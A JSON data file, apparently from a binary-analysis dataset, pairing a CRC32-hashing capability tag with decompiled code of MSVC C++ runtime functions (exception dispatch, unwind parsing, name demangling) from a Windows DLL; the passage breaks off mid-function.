{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "1800060e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Variable defined which should be unmapped: var_bp_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800060e0(int32_t *arg1, ulong arg2, ulong arg3, int32_t *arg4, ulong *noname_4, ulong noname_5, \n                  uint64_t noname_6, int32_t *noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong arg_90h, ulong arg_98h, \n                  ulong arg_a0h, ulong arg_a8h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    uint32_t uVar11;\n    ulong var_8h_2;\n    ulong var_10h;\n    uchar auStack360 [32];\n    ulong *puStack328;\n    ulong *puStack320;\n    ulong uStack312;\n    ulong uStack304;\n    uint64_t uStack296;\n    int32_t *piStack288;\n    char cStack280;\n    char cStack272;\n    char cStack264;\n    int32_t iStack260;\n    ulong uStack256;\n    int32_t *piStack248;\n    ulong uStack240;\n    int64_t iStack232;\n    uint64_t uStack224;\n    int64_t iStack216;\n    int32_t *piStack208;\n    int32_t iStack200;\n    int32_t iStack196;\n    int32_t iStack192;\n    uint32_t uStack188;\n    int32_t iStack184;\n    ulong *puStack176;\n    ulong uStack168;\n    uint uStack160;\n    uint uStack156;\n    uint32_t uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    ulong var_58h;\n    uint64_t var_bp_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_bp_28h;\n    ulong var_10h_2;\n    ulong var_8h;\n    uint64_t uVar12;\n    \n    var_bp_50h = *0x180090000 ^ auStack360;\n    piStack208 = noname_7;\n    cStack264 = '\\0';\n    uStack256 = arg3;\n    uStack240 = arg2;\n    uVar6 = fcn.1800085f4(arg2, arg4, noname_4);\n    if ((-2 < uVar6) && (uVar6 < *(noname_4 + 4))) {\n        if ((*arg1 == -0x1f928c9d) && (((arg1[6] == 4 && (arg1[8] + 0xe66cfae0U < 3)) && (*(arg1 + 0xc) == 0)))) {\n            iVar8 = fcn.1800055fc();\n            if (*(iVar8 + 0x20) == 0) goto code_r0x000180006548;\n            iVar8 = fcn.1800055fc();\n            arg1 = *(iVar8 + 0x20);\n            iVar8 = fcn.1800055fc();\n            cStack264 = '\\x01';\n            arg3 = *(iVar8 + 0x28);\n            uStack256 = arg3;\n            fcn.180004748(*(arg1 + 0xe));\n            if (((*arg1 == -0x1f928c9d) && (arg1[6] == 4)) && ((arg1[8] + 0xe66cfae0U < 3 && (*(arg1 + 0xc) == 0))))\n            goto code_r0x0001800065af;\n            iVar8 = fcn.1800055fc();\n            if (*(iVar8 + 0x38) != 0) {\n                iVar8 = fcn.1800055fc();\n                uVar10 = *(iVar8 + 0x38);\n                iVar8 = fcn.1800055fc();\n                *(iVar8 + 0x38) = 0;\n                cVar5 = fcn.18000872c(arg1, uVar10);\n                arg3 = uStack256;\n                if (cVar5 == '\\0') {\n                    cVar5 = fcn.18000881c(uVar10);\n                    if (cVar5 != '\\0') {\n                        fcn.1800049a4(arg1);\n                        fcn.18000791c(&var_bp_68h);\n                        fcn.180004c88(&var_bp_68h, 0x18008ec68);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    fcn.180016bf8();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n            }\n        }\n        uStack168 = *(arg4 + 2);\n        puStack176 = noname_4;\n        if (((*arg1 == -0x1f928c9d) && (arg1[6] == 4)) && (arg1[8] + 0xe66cfae0U < 3)) {\n            if (*(noname_4 + 0xc) != 0) {\n                puStack320 = puStack320 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n                puStack328 = noname_4;\n                fcn.180003f80(&uStack144, &puStack176, uVar6, arg4);\n                uStack160 = uStack144;\n                uStack156 = uStack140;\n                uStack152 = var_80h;\n                uStack148 = var_80h._4_4_;\n                if (var_80h < var_70h) {\n                    iVar8 = CONCAT44(uStack140, uStack144);\n                    iStack232 = iVar8;\n                    do {\n                        uVar12 = 0;\n                        iVar9 = *(*CONCAT44(uStack156, uStack160) + 0x10) + var_80h * 0x14;\n                        piVar1 = iVar9 + *(iVar8 + 8);\n                        iStack200 = *piVar1;\n                        iStack196 = piVar1[1];\n                        iStack192 = piVar1[2];\n                        uVar4 = piVar1[3];\n                        iStack184 = *(iVar9 + 0x10 + *(iVar8 + 8));\n                        uStack188 = uVar4;\n                        if (((iStack200 <= uVar6) && (uVar6 <= iStack196)) &&\n                           (iStack216 = iStack184 + *(arg4 + 2),  arg2 = uStack240,  uVar4 != 0)) {\n                            do {\n                                puVar2 = iStack216 + uVar12 * 0x14;\n                                var_bp_68h._0_4_ = *puVar2;\n                                var_bp_68h._4_4_ = puVar2[1];\n                                var_bp_60h._0_4_ = puVar2[2];\n                                var_bp_60h._4_4_ = puVar2[3];\n                                var_58h._0_4_ = *(iStack216 + 0x10 + uVar12 * 0x14);\n                                iVar8 = fcn.18000471c();\n                                piStack248 = iVar8 + 4 + *(*(arg1 + 0xc) + 0xc);\n                                iVar8 = fcn.18000471c();\n                                iStack260 = *(iVar8 + *(*(arg1 + 0xc) + 0xc));\n                                arg2 = uStack240;\n                                iVar8 = iStack232;\n                                for (; uStack240 = arg2,  iStack232 = iVar8,  0 < iStack260; iStack260 = iStack260 + -1)\n                                {\n                                    iVar8 = fcn.18000471c();\n                                    uStack224 = iVar8 + *piStack248;\n                                    iVar7 = fcn.180006fc0(&var_bp_68h, uStack224, *(arg1 + 0xc));\n                                    arg2 = uStack240;\n                                    if (iVar7 != 0) {\n                                        cStack272 = noname_5;\n                                        cStack280 = cStack264;\n                                        piStack288 = piStack208;\n                                        uStack296 = uStack296 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n                                        uStack304 = &iStack200;\n                                        uStack312 = uStack224;\n                                        puStack320 = &var_bp_68h;\n                                        puStack328 = noname_4;\n                                        fcn.180005f38(arg1, uStack240, uStack256, arg4);\n                                        iVar8 = iStack232;\n                                        goto code_r0x000180006423;\n                                    }\n                                    piStack248 = piStack248 + 1;\n                                    iVar8 = iStack232;\n                                }\n                                uVar11 = uVar12 + 1;\n                                uVar12 = uVar11;\n                            } while (uVar11 != uVar4);\n                        }\ncode_r0x000180006423:\n                        var_80h._0_4_ = var_80h + 1;\n                    } while (var_80h < var_70h);\n                }\n            }\n            iVar8 = 0;\n            if ((0x19930520 < (*noname_4 & 0x1fffffff)) &&\n               (((*(noname_4 + 4) != 0 && (iVar9 = fcn.180004708(),  iVar9 + *(noname_4 + 4) != 0)) ||\n                (((*(noname_4 + 0x24) >> 2 & 1) != 0 && (cVar5 = fcn.180003dc4(arg4, noname_4),  cVar5 == '\\0')))))) {\n                if ((*(noname_4 + 0x24) >> 2 & 1) != 0) {\n                    iVar8 = fcn.1800055fc();\n                    *(iVar8 + 0x20) = arg1;\n                    iVar8 = fcn.1800055fc();\n                    *(iVar8 + 0x28) = uStack256;\n                    fcn.180016bf8();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                if (*(noname_4 + 4) != 0) {\n                    iVar8 = fcn.180004708();\n                    iVar8 = iVar8 + *(noname_4 + 4);\n                }\n                cVar5 = fcn.18000872c(arg1, iVar8);\n                if (cVar5 == '\\0') {\n                    uVar10 = fcn.180003e90(arg2, arg4, noname_4, &uStack224);\n                    cStack280 = noname_5;\n                    uStack296 = 0;\n                    uStack304 = CONCAT44(uStack304._4_4_, 0xffffffff);\n                    uStack312 = CONCAT44(uStack312._4_4_, 0xffffffff);\n                    puStack320 = noname_4;\n                    puStack328 = NULL;\n                    piStack288 = arg4;\n                    fcn.18000426c(arg2, arg1, uStack256, uVar10);\n                }\n            }\n        }\n        else if (*(noname_4 + 0xc) != 0) {\n            if (noname_5 != '\\0') goto code_r0x0001800065af;\n            uStack304 = noname_7;\n            uStack312 = uStack312 & 0xffffffff00000000 | noname_6 & 0xffffffff;\n            puStack320 = puStack320 & 0xffffffff00000000 | uVar6;\n            puStack328 = noname_4;\n            fcn.180006ab4(arg1, arg2, arg3, arg4);\n        }\n        iVar8 = fcn.1800055fc();\n        if (*(iVar8 + 0x38) == 0) {\ncode_r0x000180006548:\n            fcn.1800024e0(var_bp_50h ^ auStack360);\n            return;\n        }\n    }\ncode_r0x0001800065af:\n    fcn.180016c34();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 2930
    },
    "180007f2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.180007f20(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    uint8_t *puVar10;\n    \n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0x24) = 0;\n    *(arg1 + 0x30) = ZEXT816(0);\n    uVar2 = **(arg1 + 8);\n    puVar8 = *(arg1 + 8) + 1;\n    *(arg1 + 0x18) = uVar2;\n    *(arg1 + 8) = puVar8;\n    if ((uVar2 & 1) != 0) {\n        uVar3 = *puVar8;\n        puVar8 = puVar8 - *((uVar3 & 0xf) + 0x180046150);\n        *(arg1 + 0x1c) = puVar8[-1] >> (*((uVar3 & 0xf) + 0x180046160) & 0x1f);\n        *(arg1 + 8) = puVar8;\n    }\n    if ((uVar2 & 2) != 0) {\n        uVar4 = *puVar8;\n        puVar8 = puVar8 + 1;\n        *(arg1 + 8) = puVar8;\n        *(arg1 + 0x20) = uVar4;\n    }\n    if ((uVar2 & 4) != 0) {\n        uVar3 = *puVar8;\n        puVar8 = puVar8 - *((uVar3 & 0xf) + 0x180046150);\n        *(arg1 + 0x24) = puVar8[-1] >> (*((uVar3 & 0xf) + 0x180046160) & 0x1f);\n        *(arg1 + 8) = puVar8;\n    }\n    piVar1 = puVar8 + 1;\n    *(arg1 + 0x28) = *puVar8;\n    *(arg1 + 8) = piVar1;\n    if ((uVar2 & 8) == 0) {\n        if ((uVar2 & 0x30) == 0x10) {\n            uVar2 = *((*piVar1 & 0xf) + 0x180046160);\n            iVar9 = piVar1 - *((*piVar1 & 0xf) + 0x180046150);\n            uVar6 = *(iVar9 + -4);\n            *(arg1 + 8) = iVar9;\n            *(arg1 + 0x30) = *(arg1 + 0x48) + (uVar6 >> (uVar2 & 0x1f));\n            return;\n        }\n        if ((uVar2 & 0x30) != 0x20) {\n            return;\n        }\n        uVar2 = *((*piVar1 & 0xf) + 0x180046160);\n        puVar10 = piVar1 - *((*piVar1 & 0xf) + 0x180046150);\n        uVar6 = *(puVar10 + -4);\n        *(arg1 + 8) = puVar10;\n        *(arg1 + 0x30) = *(arg1 + 0x48) + (uVar6 >> (uVar2 & 0x1f));\n        uVar2 = *((*puVar10 & 0xf) + 0x180046160);\n        iVar9 = puVar10 - *((*puVar10 & 0xf) + 0x180046150);\n        uVar6 = *(iVar9 + -4);\n        *(arg1 + 8) = iVar9;\n        uVar7 = *(arg1 + 0x48) + (uVar6 >> (uVar2 & 0x1f));\n    }\n    else {\n        if ((uVar2 & 0x30) == 0x10) {\n            iVar5 = *piVar1;\n            *(arg1 + 8) = puVar8 + 2;\n            *(arg1 + 0x30) = iVar5;\n            return;\n        }\n        if ((uVar2 & 0x30) != 0x20) {\n            return;\n        }\n        iVar5 = *piVar1;\n        *(arg1 + 8) = puVar8 + 2;\n        *(arg1 + 0x30) = iVar5;\n        uVar7 = puVar8[2];\n        *(arg1 + 8) = puVar8 + 3;\n    }\n    *(arg1 + 0x38) = uVar7;\n    return;\n}\n",
        "token_count": 1105
    },
    "180009c1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** fcn.180009c10(char **arg1, char **arg2)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    char **ppcVar4;\n    int64_t iVar5;\n    ulong *arg2_00;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    ulong var_70h;\n    ulong var_78h;\n    char *pcStack296;\n    uint32_t uStack288;\n    uint uStack284;\n    char *pcStack280;\n    uint32_t uStack272;\n    char *pcStack264;\n    uint32_t uStack256;\n    uint uStack252;\n    ulong auStack248 [2];\n    char *pcStack232;\n    uint32_t uStack224;\n    char **ppcStack216;\n    char *pcStack208;\n    uint32_t uStack200;\n    int32_t iStack192;\n    char *pcStack184;\n    uint32_t uStack176;\n    char *pcStack168;\n    uint32_t uStack160;\n    char *pcStack152;\n    uint32_t uStack144;\n    char *var_80h;\n    ulong var_78h_2;\n    ulong var_70h_2;\n    ulong var_68h;\n    ulong var_bp_60h;\n    ulong var_bp_58h;\n    ulong var_bp_50h;\n    ulong var_bp_48h;\n    ulong var_bp_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_bp_10h;\n    \n    pcStack280 = NULL;\n    iStack192 = *0x1800914b8 - *0x1800914c0;\n    uStack272 = 0;\n    uVar2 = fcn.180010478();\n    ppcStack216 = arg2 + 1;\n    if ((*arg2 == NULL) || ((*ppcStack216 & 0x200) == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (uVar2 == 0xffff) {\n        *(arg1 + 1) = 0;\n        *(arg1 + 1) = 2;\n        *arg1 = NULL;\n        return arg1;\n    }\n    if (uVar2 == 0xfffe) {\n        uStack256 = 0;\n        pcStack264 = 0x180047780;\n        fcn.1800097fc(&pcStack264, arg1, arg2);\n        return arg1;\n    }\n    if (uVar2 == 0xfffd) {\n        *arg1 = *arg2;\n        *(arg1 + 1) = *ppcStack216;\n        return arg1;\n    }\n    uVar9 = uVar2 & 0x8000;\n    if (uVar9 == 0) {\ncode_r0x00018000a55f:\n        fcn.180009944(&pcStack280, arg2);\n        uVar10 = uVar2 & 0x7c00;\n        if (uVar9 == 0) {\n            if ((uVar10 - 0x6800 & 0xfffff7ff) == 0) {\n                fcn.180010d00(arg1, &pcStack280);\n                return arg1;\n            }\n            if (uVar10 == 0x6000) {\n                uStack288 = 2;\n                pcStack296 = 0x1800471f0;\n                pcStack264 = 0x1800471f0;\n                uStack256 = 2;\n                uStack252 = uStack284;\n                uVar3 = fcn.180009828(&pcStack280, auStack248);\n                fcn.18000c998(&pcStack296);\n                uVar3 = fcn.1800097fc(uVar3, &var_70h_2, &pcStack296);\n                fcn.1800097d0(uVar3, arg1, &pcStack264);\n                return arg1;\n            }\n        }\n        if ((uVar2 & 0xfc00) == 0x7c00) {\n            fcn.180010c84(arg1, &pcStack280);\n            return arg1;\n        }\n        bVar13 = (uVar2 & 0x1800) == 0x800;\n        bVar12 = (uVar2 & 0x6000) == 0;\n        if (uVar9 != 0) {\n            bVar12 = bVar13;\n        }\n        uVar6 = uVar2 & 0x1b00;\n        uVar8 = (-bVar12 & 0xfffff400) + 0x1000 & uVar2;\n        if (uVar8 == 0) {\ncode_r0x00018000a732:\n            if ((uVar9 == 0) && (uVar7 = uStack272,  uVar10 == 0x7800)) goto code_r0x00018000aa7b;\n            if (uVar8 != 0) goto code_r0x00018000a74c;\ncode_r0x00018000a7b3:\n            ppcVar4 = fcn.18000d078(auStack248, &pcStack280);\n            pcStack280 = *ppcVar4;\n            uVar10 = *(ppcVar4 + 1);\n            uStack272 = *(ppcVar4 + 1);\n        }\n        else {\n            if (uVar6 == 0x1000 && uVar9 != 0) {\n                pcStack296 = \"`local static destructor helper\\'\";\n                uStack288 = 0x20;\n                fcn.1800098c4(&pcStack280, &pcStack296);\ncode_r0x00018000a74c:\n                if ((uVar6 != 0x1100 || uVar9 == 0) && (uVar6 != 0x1200 || uVar9 == 0)) goto code_r0x00018000a7b3;\n            }\n            else {\n                if (uVar6 == 0x1100 && uVar9 != 0) {\n                    pcStack296 = \"`template static data member constructor helper\\'\";\n                    uStack288 = 0x30;\n                }\n                else {\n                    if (uVar6 != 0x1200 || uVar9 == 0) goto code_r0x00018000a732;\n                    pcStack296 = \"`template static data member destructor helper\\'\";\n                    uStack288 = 0x2f;\n                }\n                fcn.1800098c4(&pcStack280, &pcStack296);\n            }\n            pcStack264 = NULL;\n            uStack256 = 0;\n            fcn.18000ab3c(&pcStack264);\n            fcn.1800097fc(&pcStack264, &pcStack296, &pcStack280);\n            pcStack280 = pcStack296;\n            uVar10 = uStack288;\n            uStack272 = uStack288;\n        }\n    }\n    else {\n        uVar10 = uVar2 & 0x1800;\n        bVar12 = uVar10 == 0x800;\n        uVar8 = 0x1000;\n        if (bVar12) {\n            uVar8 = 0x400;\n        }\n        uVar8 = uVar8 & uVar2;\n        if (((uVar8 != 0) && (((uVar2 & 0x1b00) - 0x1000 & 0xfffffcff) == 0)) && ((uVar2 & 0x1b00) != 0x1300))\n        goto code_r0x00018000a55f;\n        uVar6 = 0;\n        if ((uVar2 >> 0xe & 1) != 0) {\n            if ((~((*0x1800914c8 >> 2 | *0x1800914c8) >> 1) & 1) == 0) {\n                iVar5 = fcn.18000b318(&pcStack296);\n                if ('\\x01' < *(iVar5 + 8)) {\n                    uVar6 = *(iVar5 + 8);\n                    uStack272 = uVar6;\n                }\n            }\n            else {\n                uVar3 = fcn.18000b318(&pcStack296);\n                pcStack232 = NULL;\n                uStack224 = 0;\n                fcn.18000ab3c(&pcStack232);\n                fcn.1800097fc(&pcStack232, &pcStack264, uVar3);\n                pcStack280 = pcStack264;\n                uVar6 = uStack256;\n                uStack272 = uStack256;\n            }\n        }\n        bVar13 = bVar12;\n        if ((uVar8 == 0) || (uVar10 != 0x1800)) {\n            pcStack152 = NULL;\n            uVar11 = uVar2 & 0x700;\n            uStack144 = 0;\n            pcStack168 = NULL;\n            uStack160 = 0;\n            pcStack184 = NULL;\n            uStack176 = 0;\n            pcStack232 = NULL;\n            uStack224 = 0;\n            var_80h = NULL;\n            var_78h_2._0_4_ = 0;\n            if (uVar8 != 0) {\n                if (uVar10 == 0x800) {\n                    if (uVar11 == 0x600) {\n                        fcn.18000c998(&pcStack264);\n                        pcStack152 = pcStack264;\n                        uStack144 = uStack256;\n                        fcn.18000c998(&pcStack264);\n                        pcStack168 = pcStack264;\n                        uStack160 = uStack256;\n                        fcn.18000c998(&pcStack264);\n                    }\n                    else {\n                        if (uVar11 != 0x500) goto code_r0x000180009ffb;\n                        fcn.18000c998(&pcStack264);\n                    }\n                    pcStack184 = pcStack264;\n                    uStack176 = uStack256;\n                }\ncode_r0x000180009ffb:\n                fcn.18000c998(&pcStack264);\n                pcStack232 = pcStack264;\n                uStack224 = uStack256;\n            }\n            if ((uVar10 == 0x800) && (uVar11 != 0x200)) {\n                pcStack264 = NULL;\n                uStack256 = 0;\n                if ((*0x1800914c8 & 0x60) == 0x60) {\n                    pcStack296 = NULL;\n                    uStack288 = 0;\n                    fcn.18000bc98(&pcStack208, &pcStack264, 0, &pcStack296);\n                    if ('\\x01' < uStack200) {\n                        var_78h_2._0_4_ = uStack200 & 0xff;\n                    }\n                }\n                else {\n                    pcStack208 = NULL;\n                    uStack200 = 0;\n                    fcn.18000bc98(&pcStack296, &pcStack208, 0, &pcStack264);\n                    var_80h = pcStack296;\n                    var_78h_2._0_4_ = uStack288;\n                }\n            }\n            if (((~(*0x1800914c8 >> 1) & 1) == 0) || ((~(*0x1800914c8 >> 4) & 1) == 0)) {\n                iVar5 = fcn.18000bb4c(&pcStack296);\n                if ((uVar6 != '\\x03') && ('\\x01' < *(iVar5 + 8))) {\n                    uStack272 = uVar6 & 0xffffff00 | *(iVar5 + 8);\n                }\n            }\n            else {\n                uVar3 = fcn.18000bb4c(&pcStack296);\n                ppcVar4 = fcn.1800097fc(uVar3, &pcStack264, &pcStack280);\n                pcStack280 = *ppcVar4;\n                uStack272 = *(ppcVar4 + 1);\n            }\n            if (*arg2 != NULL) {\n                if ((pcStack280 == NULL) || ((*0x1800914c8 & 0x1000) != 0)) {\n                    uStack272 = *ppcStack216;\n                    pcStack280 = *arg2;\n                }\n                else {\n                    pcStack208 = NULL;\n                    uStack200 = 0;\n                    fcn.18000ab3c(&pcStack208);\n                    fcn.1800097fc(&pcStack208, &pcStack296, arg2);\n                    fcn.180009944(&pcStack280, &pcStack296);\n                }\n            }\n            ppcStack216 = NULL;\n            pcStack208 = NULL;\n            uVar6 = 0;\n            if (bVar1) {\n                uVar3 = fcn.18000ee60(&var_bp_60h);\n                pcStack264 = NULL;\n                uStack256 = 0;\n                fcn.18000ab3c(&pcStack264);\n                fcn.1800097fc(&pcStack264, &pcStack296, uVar3);\n                fcn.180009944(&pcStack280, &pcStack296);\n                uVar7 = uStack272;\n                if ((*0x1800914c8 & 0x1000) != 0) goto code_r0x00018000aa7b;\n            }\n            else {\n                ppcStack216 = fcn.18000d95c(0x1800914e0, 0x10);\n                if (ppcStack216 == NULL) {\n                    ppcStack216 = NULL;\n                }\n                else {\n                    *ppcStack216 = NULL;\n                    *(ppcStack216 + 1) = 0;\n                }\n                ppcVar4 = fcn.18000ee60(&var_bp_60h);\n                pcStack208 = *ppcVar4;\n                uVar6 = *(ppcVar4 + 1);\n            }\n            if (uVar8 != 0) {\n                if (uVar10 == 0x800) {\n                    if (uVar11 == 0x600) {\n                        pcStack296 = \"`vtordispex{\";\n                        uStack288 = 0xc;\n                        uVar3 = fcn.1800092a8(&var_bp_60h, &pcStack296);\n                        fcn.1800097fc(uVar3, &pcStack296, &pcStack152);\n                        uVar3 = fcn.180009828(&pcStack296, &pcStack264);\n                        uVar3 = fcn.1800097fc(uVar3, &var_bp_50h, &pcStack168);\n                        uVar3 = fcn.180009828(uVar3, &var_bp_40h);\n                        ppcVar4 = fcn.1800097fc(uVar3, &var_70h_2, &pcStack184);\n                        arg2_00 = auStack248;\n                    }\n                    else {\n                        if (uVar11 != 0x500) goto code_r0x00018000a33c;\n                        pcStack296 = \"`vtordisp{\";\n                        uStack288 = 10;\n                        uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n                        fcn.1800097fc(uVar3, &pcStack296, &pcStack184);\n                        arg2_00 = &var_70h_2;\n                        ppcVar4 = &pcStack296;\n                    }\n                    uVar3 = fcn.180009828(ppcVar4, arg2_00);\n                    fcn.180009944(&pcStack280, uVar3);\n                }\n                else {\ncode_r0x00018000a33c:\n                    pcStack296 = \"`adjustor{\";\n                    uStack288 = 10;\n                    fcn.1800098c4(&pcStack280, &pcStack296);\n                }\n                pcStack296 = 0x1800471ec;\n                uStack288 = 3;\n                uVar3 = fcn.1800097d0(&pcStack232, auStack248, &pcStack296);\n                fcn.180009944(&pcStack280, uVar3);\n            }\n            if ((*0x1800914dc == 1) && (*0x1800914d8 == 0)) {\n                *0x1800914d8 = iStack192;\n            }\n            uVar3 = fcn.18000ae2c(auStack248);\n            pcStack264 = NULL;\n            uStack256 = 0;\n            fcn.18000ab3c(&pcStack264);\n            fcn.1800097fc(&pcStack264, &pcStack296, uVar3);\n            uVar3 = fcn.180009828(&pcStack296, &var_70h_2);\n            fcn.180009944(&pcStack280, uVar3);\n            if ((uVar10 == 0x800) && (uVar11 != 0x200)) {\n                fcn.180009944(&pcStack280, &var_80h);\n            }\n            if ((~(*0x1800914c8 >> 0x13) & 1) == 0) {\n                iVar5 = fcn.18000ec84(auStack248);\n                if ((uStack272 != '\\x03') && ('\\x01' < *(iVar5 + 8))) {\n                    uStack272 = uStack272 & 0xffffff00 | *(iVar5 + 8);\n                }\n            }\n            else {\n                uVar3 = fcn.18000ec84(auStack248);\n                fcn.180009944(&pcStack280, uVar3);\n            }\n            uVar3 = fcn.18000da00(auStack248);\n            fcn.180009944(&pcStack280, uVar3);\n            if ((~(*0x1800914c8 >> 8) & 1) == 0) {\n                iVar5 = fcn.180010454(auStack248);\n                if ((uStack272 != '\\x03') && ('\\x01' < *(iVar5 + 8))) {\n                    uStack272 = uStack272 & 0xffffff00 | *(iVar5 + 8);\n                }\n            }\n            else {\n                uVar3 = fcn.180010454(auStack248);\n                fcn.180009944(&pcStack280, uVar3);\n            }\n            uVar10 = uStack272;\n            iVar5 = fcn.18000cae4(auStack248);\n            if ((uStack272 != '\\x03') && ('\\x01' < *(iVar5 + 8))) {\n                uVar10 = uVar10 & 0xffffff00 | *(iVar5 + 8);\n                uStack272 = uVar10;\n            }\n            if (((~(*0x1800914c8 >> 2) & 1) != 0) && (ppcStack216 != NULL)) {\n                *ppcStack216 = pcStack280;\n                *(ppcStack216 + 1) = uVar10;\n                pcStack280 = pcStack208;\n                uVar10 = uVar6;\n                uStack272 = uVar6;\n            }\n        }\n        else {\n            uVar3 = fcn.180009828(arg2, &pcStack264);\n            fcn.18000c998(&pcStack296);\n            uVar3 = fcn.1800097fc(uVar3, &pcStack232, &pcStack296);\n            fcn.180009944(&pcStack280, uVar3);\n            fcn.180010a40(&pcStack296);\n            if ((*0x1800914c8 & 0x1000) == 0) {\n                pcStack232 = NULL;\n                uStack224 = 0;\n                pcStack264 = 0x1800471ec;\n                uStack256 = 3;\n                fcn.18000ab3c(&pcStack232);\n                fcn.1800097fc(&pcStack232, &pcStack168, &pcStack296);\n                uVar3 = fcn.1800097d0(&pcStack168, &pcStack152, &pcStack264);\n                fcn.180009944(&pcStack280, uVar3);\n            }\n            uStack256 = 2;\n            pcStack264 = 0x1800471f0;\n            pcStack296 = 0x1800471f0;\n            uStack288 = 2;\n            uStack284 = uStack252;\n            fcn.1800098c4(&pcStack280, &pcStack296);\n            fcn.18000bb4c(&pcStack296);\n            uVar10 = uStack272;\n            if ((((~(*0x1800914c8 >> 1) & 1) != 0) && (uVar10 = uStack272,  (~(*0x1800914c8 >> 4) & 1) != 0)) &&\n               (uVar10 = uStack272,  (*0x1800914c8 & 0x1000) == 0)) {\n                pcStack232 = NULL;\n                uStack224 = 0;\n                fcn.18000ab3c(&pcStack232);\n                fcn.1800097fc(&pcStack232, &pcStack264, &pcStack296);\n                uVar3 = fcn.180009828(&pcStack264, &pcStack168);\n                ppcVar4 = fcn.1800097fc(uVar3, &pcStack152, &pcStack280);\n                pcStack280 = *ppcVar4;\n                uVar10 = *(ppcVar4 + 1);\n                uStack272 = *(ppcVar4 + 1);\n            }\n        }\n    }\n    uStack288 = uVar10;\n    if (bVar12) {\n        if ((~(*0x1800914c8 >> 9) & 1) != 0) {\n            uVar10 = uVar2 & 0x700;\n            if (uVar9 == 0 || uVar10 == 0x200) {\n                pcStack296 = \"static \";\n                uStack288 = 7;\n                uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n                fcn.1800097fc(uVar3, &pcStack296, &pcStack280);\n                pcStack280 = pcStack296;\n                uStack272 = uStack288;\n            }\n            if (((uVar9 != 0) && (uVar10 == 0x100)) ||\n               ((uVar8 != 0 && (((uVar10 - 0x400 & 0xfffffcff) == 0 && (uVar10 != 0x700)))))) {\n                pcStack296 = \"virtual \";\n                uStack288 = 8;\n                uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n                fcn.1800097fc(uVar3, &pcStack296, &pcStack280);\n                pcStack280 = pcStack296;\n                uStack272 = uStack288;\n            }\n        }\n        if ((~(*0x1800914c8 >> 7) & 1) != 0) {\n            uVar10 = uVar2 & 0xc0;\n            if (uVar9 != 0) {\n                bVar13 = uVar10 == 0x40;\n            }\n            if (bVar13) {\n                pcStack296 = \"private: \";\n                uStack288 = 9;\n            }\n            else {\n                bVar1 = (uVar2 & 0x1800) == 0x1000;\n                if (uVar9 != 0) {\n                    bVar1 = uVar10 == 0x80;\n                }\n                if (bVar1) {\n                    pcStack296 = \"protected: \";\n                    uStack288 = 0xb;\n                }\n                else {\n                    uVar6 = uVar2 & 0x1800;\n                    if (uVar9 != 0) {\n                        uVar6 = uVar10;\n                    }\n                    if (uVar6 != 0) goto code_r0x00018000a9c4;\n                    pcStack296 = \"public: \";\n                    uStack288 = 8;\n                }\n            }\n            uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n            fcn.1800097fc(uVar3, &pcStack296, &pcStack280);\n            pcStack280 = pcStack296;\n            uStack272 = uStack288;\n        }\n    }\ncode_r0x00018000a9c4:\n    if ((uVar8 != 0) && ((*0x1800914c8 & 0x1000) == 0)) {\n        pcStack296 = \"[thunk]:\";\n        uStack288 = 8;\n        uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n        fcn.1800097fc(uVar3, &pcStack296, &pcStack280);\n        pcStack280 = pcStack296;\n        uStack272 = uStack288;\n    }\n    uVar7 = uStack288;\n    if ((uVar2 >> 0x10 & 